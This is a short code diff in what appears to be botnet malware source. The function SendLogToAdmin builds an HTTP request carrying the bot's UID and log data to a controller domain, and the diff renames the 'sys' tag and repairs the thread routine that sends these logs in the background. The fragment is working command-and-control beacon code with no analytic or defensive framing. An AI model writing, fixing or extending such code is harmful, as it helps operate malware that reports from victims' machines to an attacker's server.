@@ -215,7 +215,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	}
 	else
 		empty[0] = 0, paramText = valText = empty;
-	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
+	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
 	if( valText != empty ) STR::Free(valText);
 	THTTPResponseRec Response;
 	ClearStruct(Response);
@@ -231,7 +231,7 @@ struct LogInfo
 };
 
 // Функция отправляет лог в отдельном потоке
-static DWORD WINAPI SendLogToAdminThread( LPVOID p )
+static DWORD WINAPI SendLogToAdminThread2( LPVOID p )
 {
 	LogInfo* p2 = (LogInfo*)p;
 	SendLogToAdmin( p2->num, p2->text );
@@ -254,7 +254,7 @@ static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
 		}
 		else
 			p->text[0] = 0;
-		StartThread( SendLogToAdmin, p );
+		StartThread( SendLogToAdminThread2, p );
 	}
 	return 0;
 }
